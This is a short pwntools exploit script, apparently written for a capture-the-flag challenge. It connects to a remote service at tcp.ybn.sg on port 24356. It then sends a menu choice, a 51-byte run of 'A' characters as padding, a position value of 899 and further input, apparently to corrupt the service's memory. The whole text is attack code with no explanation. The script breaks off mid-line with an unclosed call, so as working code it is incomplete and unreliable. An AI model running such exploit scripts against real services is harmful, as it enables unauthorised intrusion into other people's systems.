from pwn import *

p = remote('tcp.ybn.sg', 24356)

padding = 'A' * 51
pos1 = 899
length = '\x97'

p.sendlineafter('>>', '1')
p.sendlineafter('>>', padding)
p.sendlineafter('>>', pos1)
p.sendlineafter('>>', '1')
p.sendlineafter('>>', 'd'
